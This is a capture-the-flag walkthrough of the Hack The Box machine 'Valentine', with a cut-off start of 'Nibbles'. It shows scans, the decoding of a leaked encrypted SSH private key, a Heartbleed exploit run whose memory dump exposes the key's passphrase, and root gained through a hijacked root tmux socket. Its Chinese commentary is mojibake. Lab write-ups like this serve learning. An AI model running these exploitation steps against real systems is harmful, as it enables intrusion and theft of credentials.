140.62 ms 10.10.14.1 2 140.81 ms 10.10.10.79 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 47.93 seconds Http æ²¡çœ‹åˆ°æœ‰ä»€ä¹ˆç‰¹åˆ«çš„ï¼Œå»åšä¸ª fuzz Fuzzâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# gobuster dir -u http://10.10.10.79/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.79/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/12 14:23:09 Starting gobuster in directory enumeration mode =============================================================== /index (Status: 200) [Size: 38] /dev (Status: 301) [Size: 308] [--&gt; http://10.10.10.79/dev/] /encode (Status: 200) [Size: 554] /decode (Status: 200) [Size: 552] /omg (Status: 200) [Size: 153356] /server-status (Status: 403) [Size: 292] =============================================================== 2022/04/12 14:26:56 Finished =============================================================== è¿™é‡Œæœ‰ä¸€ä¸ª &#x2F;dev ç›®å½•ï¼Œå»æŸ¥çœ‹ä¸€ä¸‹ &#x2F;dev ä¸­æœ‰ä¸¤ä¸ªæ–‡ä»¶ hype_key å’Œ notes.txt å»åˆ†åˆ«æŸ¥çœ‹ä¸€ä¸‹ notes.txt To do: 1) Coffee. 2) Research. 3) Fix decoder/encoder before going live. 4) Make sure encoding/decoding is only done client-side. 5) Don&#39;t use the decoder/encoder until any of this is done. 6) Find a better way to take notes. hype_key 2d 2d 2d 2d 2d 42 45 47 49 4e 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d 0d 0a 50 72 6f 63 2d 54 79 70 65 3a 20 34 2c 45 4e 43 52 59 50 54 45 44 0d 0a 44 45 4b 2d 49 6e 66 6f 3a 20 41 45 53 2d 31 32 38 2d 43 42 43 2c 41 45 42 38 38 43 31 34 30 46 36 39 42 46 32 30 37 34 37 38 38 44 45 32 34 41 45 34 38 44 34 36 0d 0a 0d 0a 44 62 50 72 4f 37 38 6b 65 67 4e 75 6b 31 44 41 71 6c 41 4e 35 6a 62 6a 58 76 30 50 50 73 6f 67 33 6a 64 62 4d 46 53 38 69 45 39 70 33 55 4f 4c 30 6c 46 30 78 66 37 50 7a 6d 72 6b 44 61 38 52 0d 0a 35 79 2f 62 34 36 2b 39 6e 45 70 43 4d 66 54 50 68 4e 75 4a 52 63 57 32 55 32 67 4a 63 4f 46 48 2b 39 52 4a 44 42 43 35 55 4a 4d 55 53 31 2f 67 6a 42 2f 37 2f 4d 79 30 30 4d 77 78 2b 61 49 36 0d 0a 30 45 49 30 53 62 4f 59 55 41 56 31 57 34 45 56 37 6d 39 36 51 73 5a 6a 72 77 4a 76 6e 6a 56 61 66 6d 36 56 73 4b 61 54 50 42 48 70 75 67 63 41 53 76 4d 71 7a 37 36 57 36 61 62 52 5a 65 58 69 0d 0a 45 62 77 36 36 68 6a 46 6d 41 75 34 41 7a 71 63 4d 2f 6b 69 67 4e 52 46 50 59 75 4e 69 58 72 58 73 31 77 2f 64 65 4c 43 71 43 4a 2b 45 61 31 54 38 7a 6c 61 73 36 66 63 6d 68 4d 38 41 2b 38 50 0d 0a 4f 58 42 4b 4e 65 36 6c 31 37 68 4b 61 54 36 77 46 6e 70 35 65 58 4f 61 55 49 48 76 48 6e 76 4f 36 53 63 48 56 57 52 72 5a 37 30 66 63 70 63 70 69 6d 4c 31 77 31 33 54 67 64 64 32 41 69 47 64 0d 0a 70 48 4c 4a 70 59 55 49 49 35 50 75 4f 36 78 2b 4c 53 38 6e 31 72 2f 47 57 4d 71 53 4f 45 69 6d 4e 52 44 31 6a 2f 35 39 2f 34 75 33 52 4f 72 54 43 4b 65 6f 39 44 73 54 52 71 73 32 6b 31 53 48 0d 0a 51 64 57 77 46 77 61 58 62 59 79 54 31 75 78 41 4d 53 6c 35 48 71 39 4f 44 35 48 4a 38 47 30 52 36 4a 49 35 52 76 43 4e 55 51 6a 77 78 30 46 49 54 6a 6a 4d 6a 6e 4c 49 70 78 6a 76 66 71 2b 45 0d 0a 70 30 67 44 30 55 63 79 6c 4b 6d 36 72 43 5a 71 61 63 77 6e 53 64 64 48 57 38 57 33 4c 78 4a 6d 43 78 64 78 57 35 6c 74 35 64 50 6a 41 6b 42 59 52 55 6e 6c 39 31 45 53 43 69 44 34 5a 2b 75 43 0d 0a 4f 6c 36 6a 4c 46 44 32 6b 61 4f 4c 66 75 79 65 65 30 66 59 43 62 37 47 54 71 4f 65 37 45 6d 4d 42 33 66 47 49 77 53 64 57 38 4f 43 38 4e 57 54 6b 77 70 6a 63 30 45 4c 62 6c 55 61 36 75 6c 4f 0d 0a 74 39 67 72 53 6f 73 52 54 43 73 5a 64 31 34 4f 50 74 73 34 62 4c 73 70 4b 78 4d 4d 4f 73 67 6e 4b 6c 6f 58 76 6e 6c 50 4f 53 77 53 70 57 79 39 57 70 36 79 38 58 58 38 2b 46 34 30 72 78 6c 35 0d 0a 58 71 68 44 55 42 68 79 6b 31 43 33 59 50 4f 69 44 75 50 4f 6e 4d 58 61 49 70 65 31 64 67 62 30 4e 64 44 31 4d 39 5a 51 53 4e 55 4c 77 31 44 48 43 47 50 50 34 4a 53 53 78 58 37 42 57 64 44 4b 0d 0a 61 41 6e 57 4a 76 46 67 6c 41 34 6f 46 42 42 56 41 38 75 41 50 4d 66 56 32 58 46 51 6e 6a 77 55 54 35 62 50 4c 43 36 35 74 46 73 74 6f 52 74 54 5a 31 75 53 72 75 61 69 32 37 6b 78 54 6e 4c 51 0d 0a 2b 77 51 38 37 6c 4d 61 64 64 73 31 47 51 4e 65 47 73 4b 53 66 38 52 2f 72 73 52 4b 65 65 4b 63 69 6c 44 65 50 43 6a 65 61 4c 71 74 71 78 6e 68 4e 6f 46 74 67 30 4d 78 74 36 72 32 67 62 31 45 0d 0a 41 6c 6f 51 36 6a 67 35 54 62 6a 35 4a 37 71 75 59 58 5a 50 79 6c 42 6c 6a 4e 70 39 47 56 70 69 6e 50 63 33 4b 70 48 74 74 76 67 62 70 74 66 69 57 45 45 73 5a 59 6e 35 79 5a 50 68 55 72 39 51 0d 0a 72 30 38 70 6b 4f 78 41 72 58 45 32 64 6a 37 65 58 2b 62 71 36 35 36 33 35 4f 4a 36 54 71 48 62 41 6c 54 51 31 52 73 39 50 75 6c 72 53 37 4b 34 53 4c 58 37 6e 59 38 39 2f 52 5a 35 6f 53 51 65 0d 0a 32 56 57 52 79 54 5a 31 46 66 6e 67 4a 53 73 76 39 2b 4d 66 76 7a 33 34 31 6c 62 7a 4f 49 57 6d 6b 37 57 66 45 63 57 63 48 63 31 36 6e 39 56 30 49 62 53 4e 41 4c 6e 6a 54 68 76 45 63 50 6b 79 0d 0a 65 31 42 73 66 53 62 73 66 39 46 67 75 55 5a 6b 67 48 41 6e 6e 66 52 4b 6b 47 56 47 31 4f 56 79 75 77 63 2f 4c 56 6a 6d 62 68 5a 7a 4b 77 4c 68 61 5a 52 4e 64 38 48 45 4d 38 36 66 4e 6f 6a 50 0d 0a 30 39 6e 56 6a 54 61 59 74 57 55 58 6b 30 53 69 31 57 30 32 77 62 75 31 4e 7a 4c 2b 31 54 67 39 49 70 4e 79 49 53 46 43 46 59 6a 53 71 69 79 47 2b 57 55 37 49 77 4b 33 59 55 35 6b 70 33 43 43 0d 0a 64 59 53 63 7a 36 33 51 32 70 51 61 66 78 66 53 62 75 76 34 43 4d 6e 4e 70 64 69 72 56 4b 45 6f 35 6e 52 52 66 4b 2f 69 61 4c 33 58 31 52 33 44 78 56 38 65 53 59 46 4b 46 4c 36 70 71 70 75 58 0d 0a 63 59 35 59 5a 4a 47 41 70 2b 4a 78 73 6e 49 51 39 43 46 79 78 49 74 39 32 66 72 58 7a 6e 73 6a 68 6c 59 61 38 73 76 62 56 4e 4e 66 6b 2f 39 66 79 58 36 6f 70 32 34 72 4c 32 44 79 45 53 70 59 0d 0a 70 6e 73 75 6b 42 43 46 42 6b 5a 48 57 4e 4e 79 65 4e 37 62 35 47 68 54 56 43 6f 64 48 68 7a 48 56 46 65 68 54 75 42 72 70 2b 56 75 50 71 61 71 44 76 4d 43 56 65 31 44 5a 43 62 34 4d 6a 41 6a 0d 0a 4d 73 6c 66 2b 39 78 4b 2b 54 58 45 4c 33 69 63 6d 49 4f 42 52 64 50 79 77 36 65 2f 4a 6c 51 6c 56 52 6c 6d 53 68 46 70 49 38 65 62 2f 38 56 73 54 79 4a 53 65 2b 62 38 35 33 7a 75 56 32 71 4c 0d 0a 73 75 4c 61 42 4d 78 59 4b 6d 33 2b 7a 45 44 49 44 76 65 4b 50 4e 61 61 57 5a 67 45 63 71 78 79 6c 43 43 2f 77 55 79 55 58 6c 4d 4a 35 30 4e 77 36 4a 4e 56 4d 4d 38 4c 65 43 69 69 33 4f 45 57 0d 0a 6c 30 6c 6e 39 4c 31 62 2f 4e 58 70 48 6a 47 61 38 57 48 48 54 6a 6f 49 69 6c 42 35 71 4e 55 79 79 77 53 65 54 42 46 32 61 77 52 6c 58 48 39 42 72 6b 5a 47 34 46 63 34 67 64 6d 57 2f 49 7a 54 0d 0a 52 55 67 5a 6b 62 4d 51 5a 4e 49 49 66 7a 6a 31 51 75 69 6c 52 56 42 6d 2f 46 37 36 59 2f 59 4d 72 6d 6e 4d 39 6b 2f 31 78 53 47 49 73 6b 77 43 55 51 2b 39 35 43 47 48 4a 45 38 4d 6b 68 44 33 0d 0a 2d 2d 2d 2d 2d 45 4e 44 20 52 53 41 20 50 52 49 56 41 54 45 20 4b 45 59 2d 2d 2d 2d 2d è¿™é‡Œæ‹¿åˆ°äº†ä¸€ä¸²äºŒè¿›åˆ¶ç¼–ç å’Œä¸€ä¸ªæç¤º æç¤ºä¸­æš—ç¤ºæˆ‘ä»¬å¯ä»¥è§£ç è¿™å †ç¼–ç ï¼Œé‚£å°±å»è¯•è¯•å§ æ¼æ´åˆ©ç”¨é¦–å…ˆè§£å¯†ä¸€ä¸‹è¿™å †ç¼–ç  â”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# curl http://10.10.10.79/dev/hype_key|xxd -r -p % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 5383 100 5383 0 0 18954 0 --:--:-- --:--:-- --:--:-- 18887 -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46 DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R 5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6 0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5 XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ +wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe 2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP 09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3 -----END RSA PRIVATE KEY----- è¿™é‡Œæ‹¿åˆ°äº†ä¸€ä¸ª ssh ç§é’¥ï¼Œæ ¹æ®æ–‡ä»¶æ ¼å¼ï¼ŒçŒœæµ‹å‡ºç”¨æˆ·åæ˜¯ hypeï¼Œå»å°è¯•ç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine] â””â”€# ssh hype@10.10.10.79 -i id_rsa The authenticity of host &#39;10.10.10.79 (10.10.10.79)&#39; can&#39;t be established. ECDSA key fingerprint is SHA256:lqH8pv30qdlekhX8RTgJTq79ljYnL2cXflNTYu8LS5w. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.79&#39; (ECDSA) to the list of known hosts. @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0644 for &#39;id_rsa&#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key &quot;id_rsa&quot;: bad permissions hype@10.10.10.79&#39;s password: ç™»å½•å¤±è´¥ï¼Œå†æ‰¾æ‰¾å…¶ä»–è·¯å­ å¿ƒè„æ»´è¡€ç”±äºæ²¡æœ‰æ€è·¯äº†ï¼Œå†å›è¿‡å¤´æ¥çœ‹çœ‹ä¹‹å‰çš„ï¼Œçœ‹ç€é¦–é¡µçš„å›¾ç‰‡ï¼Œä¼¼ä¹åƒæ˜¯å¿ƒè„æ»´è¡€ï¼Œå»æ£€æµ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine] â””â”€# nmap --script=ssl-heartbleed 10.10.10.79 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-12 02:59 EDT Nmap scan report for 10.10.10.79 Host is up (0.24s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https | ssl-heartbleed: | VULNERABLE: | The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption. | State: VULNERABLE | Risk factor: High | OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves. | | References: | http://www.openssl.org/news/secadv_20140407.txt | https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160 |_ http://cvedetails.com/cve/2014-0160/ Nmap done: 1 IP address (1 host up) scanned in 54.59 seconds ç¡®å®å­˜åœ¨å¿ƒè„æ»´è¡€ï¼Œé‚£å°±å»åˆ©ç”¨ä¸€ä¸‹å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit heartbleed ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- OpenSSL 1.0.1f TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure (Multiple SSL/TLS Versions) | multiple/remote/32764.py OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (1) | multiple/remote/32791.c OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Information Leak (2) (DTLS Support) | multiple/remote/32998.c OpenSSL TLS Heartbeat Extension - &#39;Heartbleed&#39; Memory Disclosure | multiple/remote/32745.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Paper Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- HeartBleed Attack - Paper | docs/english/49313-heartbleed-at ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine] â””â”€# python exploit.py 10.10.10.79 1 â¨¯ Connecting... Sending Client Hello... Waiting for Server Hello... ... received message: type = 22, ver = 0302, length = 66 ... received message: type = 22, ver = 0302, length = 885 ... received message: type = 22, ver = 0302, length = 331 ... received message: type = 22, ver = 0302, length = 4 Sending heartbeat request... ... received message: type = 24, ver = 0302, length = 16384 Received heartbeat response: 0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C .@....SC[...r... 0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90 .+..H...9....... 0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0 .w.3....f.....&quot;. 0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00 !.9.8.........5. 0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0 ................ 0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00 ............3.2. 0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00 ....E.D...../... 0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00 A............... 0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01 ................ 0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00 ..I...........4. 00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00 2............... 00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00 ................ 00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00 ................ 00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E ....#.......0.0. 00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F 1/decode.php..Co 00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C ntent-Type: appl 0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F ication/x-www-fo 0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43 rm-urlencoded..C 0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34 ontent-Length: 4 0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63 2....$text=aGVhc 0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64 nRibGVlZGJlbGlld 0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D AA mV0aGVoeXBlCg==. 0160: 3E 27 75 BB 3A EF D9 09 57 8D 5F D1 F7 08 99 48 &gt;&#39;u.:...W._....H 0170: 7F 80 41 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C ..A............. è¿™é‡Œå‡ºæ¥äº†ä¸€ä¸²å¯†æ–‡ aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== ç„¶åä½¿ç”¨ä¹‹å‰æˆ‘ä»¬æ‰¾åˆ°çš„ &#x2F;decode æ¥è¿›è¡Œè§£å¯† Your input: aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== Your encoded input: heartbleedbelievethehype å¾—åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œå†å»ç™»å½•è¯•è¯• åˆ«å¿˜äº†åŠ ä¸Šæƒé™ chmod 600 id_rsa â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Valentine] â””â”€# ssh hype@10.10.10.79 -i id_rsa Enter passphrase for key &#39;id_rsa&#39;: Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) * Documentation: https://help.ubuntu.com/ New release &#39;14.04.5 LTS&#39; available. Run &#39;do-release-upgrade&#39; to upgrade to it. Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3 hype@Valentine:~$ whoami&amp;&amp;id hype uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare) ç™»å½•æˆåŠŸ hype@Valentine:~/Desktop$ cat user.txt e6710a5464769fd5fcd216e076961750 æˆåŠŸæ‹¿åˆ° user æƒé™çš„ flag æ–‡ä»¶ æƒé™æå‡Step 1hype@Valentine:~/Desktop$ uname -a Linux Valentine 3.2.0-23-generic #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å°æœºå™¨ç‰ˆæœ¬å¾ˆè€ï¼Œé‚£è‚¯å®šæ˜¯å­˜åœ¨è„ç‰›çš„ï¼Œåœ¨æµ‹è¯•ä¸­ä¹Ÿç¡®å®å¯ä»¥ä½¿ç”¨è„ç‰›ç›´æ¥ææƒï¼Œå¤§å®¶å¯ä»¥è‡ªå·±æµ‹è¯•ä¸€ä¸‹ Step 2hype@Valentine:~/Desktop$ history 1 exit 2 exot 3 exit 4 ls -la 5 cd / 6 ls -la 7 cd .devs 8 ls -la 9 tmux -L dev_sess 10 tmux a -t dev_sess 11 tmux --help 12 tmux -S /.devs/dev_sess 13 exit æŸ¥çœ‹å†å²å‘½ä»¤ï¼Œçœ‹åˆ°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ &#x2F;.devs&#x2F;dev_sess å»æŸ¥çœ‹ä¸€ä¸‹ hype@Valentine:~/Desktop$ cd /.devs/ hype@Valentine:/.devs$ ls -la total 8 drwxr-xr-x 2 root hype 4096 Apr 11 00:00 . drwxr-xr-x 26 root root 4096 Feb 6 2018 .. srw-rw---- 1 root hype 0 Apr 11 00:00 dev_sess hype@Valentine:/.devs$ cat dev_sess cat: dev_sess: No such device or address æˆ‘ä»¬æ˜¯æ— æƒé™æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ†æä¸€ä¸‹ é¦–å…ˆç¬¬ 9 è¡Œä½¿ç”¨ -L è¿è¡Œäº†ï¼Œç„¶åç¬¬ 10 è¡Œä½¿ç”¨ a -t è¿è¡Œäº†ï¼Œç„¶åç¬¬ 11 è¡Œè¿˜æŸ¥çœ‹äº†å¸®åŠ©ï¼Œæ¥ç€åœ¨ç¬¬ 12 è¡Œä½¿ç”¨ -S è¿è¡Œåï¼Œå†è¿è¡Œäº†ä¸€ä¸ª exit ï¼Œé‚£æ˜¯ä¸æ˜¯æ„å‘³ç€ -S æˆåŠŸäº†å‘¢ï¼Ÿæˆ‘ä»¬ä¹Ÿå»å°è¯•ä¸€ä¸‹ root@Valentine:/# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root) æˆåŠŸææƒåˆ° root æƒé™ root@Valentine:~# cat root.txt f1bb6d759df1f272914ebbc9ed7765b2 æˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Nibbles - Hackthebox","slug":"Hackthebox - Nibbles","date":"2022-04-09T11:38:36.000Z","updated":"2023-05-20T02:08:33.000Z","comments":true,"path":"2022/04/09/Hackthebox - Nibbles/","link":"","permalink":"http://www.lucifiel.com/2022/04/09/Hackthebox%20-%20Nibbles/","excerpt":"","text":"Hackthebox - Nibblesé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æ”¶é›†Nmapâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.75 Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-08 11:19 CST Nmap scan report for 10.10.10.75 Host is up (0.14s latency). Not shown: 65533 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA) | 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA) |_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519) 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Site doesn&#39;t have a title (text/html). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.91%E=4%D=4/8%OT=22%CT=1%CU=33159%PV=Y%DS=2%DC=T%G=Y%TM=624FA9D0 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=2%ISR=10C%TI=Z%CI=I%II=I%TS=8)OPS( OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11 OS:NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN( OS:R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R= OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F= OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD= OS:S) Network Distance: 2 hops Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel TRACEROUTE (using port 3306/tcp) HOP RTT ADDRESS 1 139.27 ms 10.10.14.1 2 139.49 ms 10.10.10.75 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 38.54 seconds Http è¿™å°çš„ http æœåŠ¡å°±è¿™ä¹ˆç‚¹ä¸œè¥¿ï¼Œä¹Ÿæ²¡ä»€ä¹ˆç”¨å•Šï¼Œæ ¹æ®é¶æœºåå­— å­—èŠ‚ ï¼Œå»çœ‹ä¸€ä¸‹æºç å§ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Nibbles] â””â”€# curl http://10.10.10.75/ &lt;b&gt;Hello world!&lt;/b&gt; &lt;!-- /nibbleblog/ directory. Nothing interesting here! --&gt; è¿™è¾¹å¯ä»¥çœ‹åˆ°ï¼ŒæŒ‚è½½äº†ä¸€ä¸ª &#x2F;nibbleblog&#x2F; ç›®å½• è¿™æ‰æ˜¯çœŸå®çš„ä¸»é¡µ å¯ä»¥çœ‹åˆ°æ˜¯ Nibbleblog æ­å»ºçš„ï¼Œä½†æ˜¯é¦–é¡µæ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œå»fuzzä¸€ä¸‹ Fuzzâ”Œâ”€â”€(rootğŸ’€lucifiel)-[/home/lucifiel] â””â”€# gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -t 200 --no-error =============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.75/nibbleblog/ [+] Method: GET [+] Threads: 200 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/04/08 